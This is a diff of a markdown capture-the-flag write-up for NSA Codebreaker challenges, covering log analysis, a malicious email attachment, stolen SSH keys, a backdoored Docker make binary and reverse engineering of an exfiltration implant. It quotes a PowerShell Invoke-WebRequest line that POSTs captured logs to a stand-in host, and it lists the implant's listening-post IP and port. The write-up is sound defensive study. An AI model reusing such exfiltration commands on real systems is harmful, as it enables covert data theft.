@@ -1,7 +1,11 @@
-# challenge 0
+# NSA-CODEBREAKER
+
+## challenge 0
+
 follow what the discord instructions
 
-# challenge 1:
+## challenge 1
+
 open pcap and plug the cidr in to wireshark ip.addr={cidr}
 
 victim -> attacker
@@ -10,9 +14,10 @@ victim -> attacker
 2. 192.168.212.45 -> 172.22.10.203
 3. 192.168.195.195.32 ->172.22.10.203
 
-# challenge 2
+## challenge 2
 
 see if the proxy log has the attacker IP we saw before 
+
 ```bash
 cat proxy.log | grep '172.22.10.203'  
 ```
@@ -51,14 +56,14 @@ for ($i = 0; $i -lt $logon.Count; $i++) {
         }
     }   
 ```
-    
+
 The result is that logon session id (LogonId: 0X30D0E7) is to blame
 
-# Challenge 3
+## Challenge 3
 
 looking at the emails and the attachements message 16 (Message-ID: <161587340000.22130.61141000145085806@oops.net>) has a strange image (see below)
 
-```
+```text
 --===============2821242667320483337==
 Content-Type: image/jpeg
 Content-Transfer-Encoding: base64
@@ -444,7 +449,7 @@ Invoke-WebRequest -uri http://vrqgb.invalid:8080 -Method Post -Body $global:log
 
 The last like gives use the domain the POST request calls to (vrqgb.invalid)
 
-# challenge 4
+## challenge 4
 
 NTUSER.DAT info
 
@@ -468,7 +473,7 @@ keys but no entry
 
 The attackers have access to builder05@dkr_prd38. This is beacuse the file existed in NTUSER.dat and there is no encrytion which means there is no password needed to use the key (https://tartarus.org/~simon/putty-snapshots/htmldoc/AppendixC.html)
 
-# challenge 5
+## challenge 5
 
 looking at the data in the docker image file given the maintainer information is stored in the JSON file
 
@@ -574,15 +579,35 @@ in looking at the files i noticed that the make file had a method called gitGrab
 
 it was placed in the f7cca439f519c3fad85e9fe65db17b4a8a7692a39888dadb8d085184e4fde89b layer @ /usr/bin/make
 
-# challenge 6
+## challenge 6
 
-ip_nounce:
-4CE7C75407068E18AABC419C7C0601BF2ED250D6A7683BBA00
-ip_ciphertext
-BC6FC607F16EA04BACBEDB7DDF6298755E8D07A54100
+Useing a combinations of ghidra and GDB w/ GEF there is a function call "sdqgmlkgandis(int)"
+this function is used to retrive encrypted data from memory. The relevant retrieved values are as follows
 
-send data to _ip_:6666
+|id|value|description|
+|--|----|-----|
+|0x1| os| used to format data retived for exil |
+|0x2| version|  used to format data retived for exil |
+|0x3| username | used to format data retived for exil |
+|0x4| timestamp | used to format data retived for exil |
+|0x5| unknown | seems to be place holder for unknown values |
+|0x6| /tmp/.gglock |lock file to allow only one instance of the program to run at a time |
+|0x7| /usr/local/src/repo | the repo folder being attacked |
+|0x8| pidof git | command to get process id of git |
+|0xe| ninja | the renamed make binary |
+|0xf| %Y-%m-%d | date formating string |
+|0x10| nightly-exfil | label for TBD most likely web data|
+|0x11| 1.4.0.3-WGX | version of the malware|
+|0x12| e399bbafad9351677a3e154916a361407789c41830c270f9cc4e5b45822259| hex endoded public key of the listening post
+|0x13| 198.51.100.227 | IP address for the listening post|
 
+in here we can see the values requested for IP, version and public key.
 
-break points: 
-0016039b
+the public key coversion was hard because you need to read it it to hex encoded characters. This is done by running `x/32c <memory addres>` this coverts the address to a string which is 32 bytes
+
+to further confirm this this funtion below is run. It is the function to send data to the LP on port 6666
+
+```c
+wolyxeplhuiyl(ip=0x7ffff77f0c94 "198.51.100.227", port=0x1a0a, output=0x7fffffffeb20 "", length=0x0)
+```
+
